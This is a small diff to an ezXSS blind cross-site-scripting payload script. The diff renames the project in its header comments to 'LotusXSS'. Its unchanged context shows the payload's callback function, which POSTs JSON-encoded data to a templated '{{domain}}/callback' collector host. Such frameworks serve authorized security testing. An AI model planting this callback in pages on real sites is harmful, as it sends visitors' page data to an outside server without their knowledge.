@@ -1,5 +1,5 @@
-// github.com/ssl/ezXSS
-// ezXSS {{version}}
+// github.com/teststudent311/LotusXSS
+// LotusXSS {{version}}
 
 function ez_n(e){return void 0!==e?e:""}
 function ez_cb(e,c=null){var t=new XMLHttpRequest();t.open('POST',(location.protocol!=='https:'?'http:':'https:')+'//{{domain}}/callback',true);t.setRequestHeader('Content-type','text/plain');t.timeout=60000;t.onreadystatechange=function(){if(t.readyState===4&&t.status===200&&c!==null){c(t.responseText);}};t.send(JSON.stringify(e));}
